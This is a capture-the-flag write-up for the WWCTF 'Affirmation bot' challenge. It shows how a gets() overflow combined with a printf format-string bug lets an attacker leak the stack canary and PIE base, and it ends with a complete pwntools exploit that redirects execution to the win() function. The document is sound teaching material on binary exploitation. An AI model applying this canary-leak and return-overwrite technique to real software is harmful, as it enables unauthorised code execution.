---
title: "Affirmation bot"
date: "2025-07-29"
tags: ["WWCTF", "format string", "buffer overflow"]
---

In this challenge they hand us a binary and its source code.

```c
checksec
File:     /home/ub1cu0/Desktop/wwctf/affirmation_bot/affirmationbot
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

Let's run the program:

```c
./affirmationbot
Tell me whats on your mind...
> hola
You said: hola
Affirmation Bot says: Spot on!
> adios
You said: adios
Affirmation Bot says: That's the best idea I've heard all day!
```

As we can see, it looks like we are in a loop that echoes our input back along with a motivational message. Let's check it in the code:

```c
while(1) {
    affirm();
}
```

```c
void affirm() {
    uint8_t buffer[128] = {0};
    printf("> ");
    gets(buffer);
    printf("You said: ");
    printf(buffer);
    printf("\nAffirmation Bot says: ");
    int index = rand() % 11;
    printf("%s\n", affirmations[index]);
    fflush(stdout);
}
```

The affirm function runs in a loop. We can also see a `gets` with no size and a `printf` with no format specifier, so we have a buffer overflow and a format string. There is also a win function:

```c
void win() {
    uint8_t flag_buffer[128] = {0};
    int fd = open("flag.txt", O_RDONLY);
    read(fd, flag_buffer, sizeof(flag_buffer));
    puts(flag_buffer);
    close(fd);
}
```

Since `PIE` and `Canary` are enabled we have to do the following:

<figure><img src="/pwn/img/affirmation-bot.png" alt=""><figcaption></figcaption></figure>

To leak the canary we can send a lot of `%p` so the program keeps returning the stack contents as pointers, and try to find the canary value. The canary always ends in `00` so the program knows where it has to stop reading it. I already fuzzed a lot of positions and found this value:

```c
> %47$p // Posición 47
You said: 0xf2acbd7b61d92e00
```

It looks good, but how do we confirm it? We can use `telescope` to see it. The canary is usually right after the rbp:

```c
pwndbg> telescope $rsp 30  // Mostramos los 30 siguientes elementos antes del rsp
00:0000│ rsp 0x7fffffffdbd0 ◂— 1
01:0008│-098 0x7fffffffdbd8 ◂— 0x6f7e388d2
02:0010│-090 0x7fffffffdbe0 ◂— 0x7024373425
03:0018│-088 0x7fffffffdbe8 ◂— 0
... ↓        15 skipped
13:0098│-008 0x7fffffffdc68 ◂— 0xf2acbd7b61d92e00 // Aquí!
14:00a0│ rbp 0x7fffffffdc70 —▸ 0x7fffffffdc80 ◂— 1
```

It is the same one! Now we know that is the canary value. Next we have to leak the `PIE`. To find the base address of the binary we first leak an instruction of the program, work out its offset from the binary base, and once we know the offset we can compute the base in our final solver.

```c
Offset = Dirección del binario leakeada - Piebase
```

With `piebase` we can get the binary address locally. Now we can fuzz with a lot of `%p` to try to find one, I found this one:

```c
pwndbg> x 0x55555555547c 
0x55555555547c <main>: 0x59058b48e5894855
```

```c
pwndbg> piebase
Calculated VA from /home/ub1cu0/Desktop/wwctf/affirmation_bot/affirmationbot = 0x555555554000
pwndbg> x 0x55555555547c - 0x555555554000
0x147c:	Cannot access memory at address 0x147c // Este es el offset
```

Now that we have everything we need we can build the solver:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./affirmationbot_patched")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b affirm
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("chal.wwctf.com", 4001)

def main():
    io = conn()
    offset = 136  # Esto podemos sacarlo mirando el código y probando a ver si crashea o no
    padding = 8   # para saltar el RBP (queremos llegar a la dirección de retorno, la cual está después del rbp)
    io.sendlineafter(b'> ', '%47$p')  # Leak del Canary
    linea = io.recvline().strip().decode()
    canary = int(linea.split("0x")[1], 16)
    log.success(f'Canary: {hex(canary)}')
    io.sendlineafter(b'> ', '%37$p') # Leak del PIE, en remoto puede variar, si no va probar posiciones cercanas al que va en local
    leaked_function_line = io.recvline().strip().decode()
    leaked_function = int(leaked_function_line.split("0x")[1], 16)
    
    exe.address = leaked_function - 0x147c
    log.success(f'Base Address: {hex(exe.address)}')
    
    payload = flat({
        offset: [
            canary,
            b'A' * padding,
            exe.symbols.win
        ]
    })

    io.sendlineafter(b'> ', payload)
    
    io.interactive()

if __name__ == "__main__":
    main()
```

Thanks for reading.
